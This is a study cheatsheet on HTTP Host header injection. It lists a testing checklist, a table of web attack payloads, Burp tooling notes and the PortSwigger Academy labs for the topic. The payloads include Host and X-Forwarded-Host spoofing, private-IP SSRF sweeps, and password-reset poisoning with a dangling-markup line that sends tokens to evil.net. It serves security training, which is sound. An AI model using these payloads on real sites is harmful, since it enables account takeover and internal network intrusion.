# Host Header Injection — Cheatsheet & PortSwigger Lab Mapping

## 1. Quick detection checklist

Run through this in order on every engagement involving a target with login/password
reset functionality or a caching/CDN layer:

1. Send `Host: <unexpected-value>` — does the request still get routed? (File 01 §5, Step 1)
2. If blocked, try port-field smuggling, suffix-matching, and known-subdomain bypasses
   (File 01 §5, Step 2)
3. Try duplicate Host headers, absolute-URI request lines, and line-wrapping to expose
   front/back-end disagreement (File 01 §5, Step 3)
4. Try `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`,
   `Forwarded` as override headers (File 01 §5, Step 4 / File 03 §2)
5. Trigger a password reset to your own test account with a poisoned Host/override
   header and inspect the resulting email (File 02 §4, Step 1)
6. Probe for routing-based SSRF using a Collaborator domain in Host, then sweep private IP
   ranges if confirmed (File 03 §5)
7. Test `X-Forwarded-For` against any IP-allowlisted endpoint and any rate-limited
   endpoint (File 03 §4)
8. Check whether Host validation is enforced on every request or only the first request of
   a reused connection (File 01 §8)

## 2. Payload quick-reference

| Goal | Payload | One-line mechanism |
|---|---|---|
| Basic probe | `Host: attacker-domain.com` | Tests whether Host is validated at all |
| Port-field bypass | `Host: target.com:bad-stuff` | Validator only checks substring before `:` |
| Suffix-match bypass | `Host: notvulnerable-target.com` | Validator uses `endsWith()`-style logic |
| Duplicate headers | Two `Host:` lines | Front-end and back-end read different instances |
| Absolute-URI smuggling | `GET https://target.com/ HTTP/1.1` + different `Host:` | Request-line vs Host-header disagreement |
| Line-wrap smuggling | Indented second `Host:` line | Folding-rule disagreement between systems |
| Override header injection | `X-Forwarded-Host: attacker-domain.com` | App prefers forwarding header over Host |
| Auth bypass | `Host: localhost` | App equates a Host string with "internal caller" |
| Vhost brute-force | `Host: intranet.<target>.com` | Reaches an internal app via shared public IP |
| Routing SSRF probe | `Host: <collaborator-subdomain>` | Confirms Host drives backend routing |
| Routing SSRF sweep | `Host: 192.168.0.§0§` (Intruder) | Brute-forces private IP range via Host |
| Flawed-parsing SSRF | Absolute-URI to real domain + `Host: <internal-ip>` | Validator checks URI; router uses Host |
| Reset poisoning | `Host:`/`X-Forwarded-Host:` poisoned during `/forgot-password` | Domain in emailed link becomes attacker-controlled |
| Dangling markup variant | `Host: target.com"><img src='//evil.net/?` | Unclosed tag captures token text that follows it |
| XFF allowlist bypass | `X-Forwarded-For: 127.0.0.1` | App trusts claimed "original IP" for access control |
| XFF rate-limit bypass | `X-Forwarded-For: <random-IP-each-request>` | Defeats per-IP throttling buckets |
| Multi-header cache poisoning | `X-Forwarded-Host:` + `X-Forwarded-Scheme:` together | Vulnerable path only triggers on the combination |

> Every payload above is explained mechanism-first in Files 01–03. This table is a recall
> aid for testing day, not a substitute for understanding *why* each one works.

## 3. Tooling notes

- **Burp Suite Repeater/Intruder** — core tools for all manual Host header testing.
  Disable "Update Host header to match target" in Intruder when fuzzing the Host header
  itself, or Burp will silently overwrite your payload.
- **Burp Collaborator** — essential for confirming routing-based SSRF and any blind
  out-of-band interaction (DNS lookups, HTTP callbacks) before committing to a full
  internal IP sweep.
- **Param Miner (Burp extension)** — automates discovery of which header names a target
  actually honors (`X-Forwarded-Host`, `X-Host`, etc.) via its "Guess headers" function,
  using a large built-in wordlist. Significantly faster than manually trying each
  candidate header by hand.
- **Exploit server (PortSwigger Academy) / your own listener in real engagements** — used
  to host the JavaScript payload for cache-poisoning labs and to capture stolen password
  reset tokens for the poisoning chain.

## 4. PortSwigger Web Security Academy — official lab order

These are the labs that live under the **HTTP Host header attacks** topic specifically,
listed in the exact difficulty-progression order PortSwigger presents them in the Academy.
Work through them in this sequence — each one builds on a technique introduced by the
previous lab.

| # | Lab name | Technique practiced | Covered in this series |
|---|---|---|---|
| 1 | Basic password reset poisoning | Host header controls the reset link domain directly | File 02, §4 |
| 2 | Host header authentication bypass | Host value used as a substitute for real access control | File 01, §6 |
| 3 | Web cache poisoning via ambiguous requests | Duplicate Host headers desync cache key vs. backend routing | File 01, §3 / §5 Step 3 |
| 4 | Routing-based SSRF | Host header drives internal load-balancer routing decisions | File 03, §5 |
| 5 | SSRF via flawed request parsing | Request-line vs. Host-header validation discrepancy | File 03, §6 |
| 6 | Host validation bypass via connection state attack | Host validated only on the first request of a reused connection | File 01, §8 |
| 7 | Password reset poisoning via dangling markup | HTML injection through reflected Host steals the token via unclosed markup, not link replacement | File 02, §5 |

**Honest disclosure:** the multi-header cache poisoning technique covered in File 03 §3
(`X-Forwarded-Host` + `X-Forwarded-Scheme` together) is demonstrated by a real PortSwigger
Academy lab — **"Web cache poisoning with multiple headers"** — but that lab is catalogued
under the separate **Web cache poisoning** topic, not the HTTP Host header attacks topic,
because PortSwigger treats web cache poisoning as its own dedicated subject area with its
own difficulty progression. It is included here because the underlying header-trust
mechanism is identical to what's covered in this series. If you want the full cache
poisoning lab progression (including this one in its proper sequence), treat it as a
separate companion topic to work through alongside this series rather than as lab #8 in
the table above.

There is currently no dedicated PortSwigger Academy lab purely isolating
`X-Forwarded-For`-based access-control or rate-limit bypass as a standalone exercise — the
concept is explained in the Academy's written content but not given its own interactive
lab. Practice for that specific technique is best done against intentionally vulnerable
local targets (e.g., DVWA, Juice Shop) or in authorized real-world engagements where an
IP-allowlisted endpoint is in scope.

## 5. Suggested practice order for this series

1. Read Files 01–03 in full before touching any lab — the mechanism explanations are the
   point, not the payload strings.
2. Complete Academy labs #1–#7 from the table above, in order.
3. Separately, complete the "Web cache poisoning with multiple headers" lab from the Web
   cache poisoning topic to round out the `X-Forwarded-Host`/`X-Forwarded-Scheme`
   combination technique from File 03 §3.
4. Revisit this cheatsheet afterward and try to reconstruct, from memory, *why* each
   payload works — not just what it is — before moving on to the next topic in the
   broader OWASP note series.
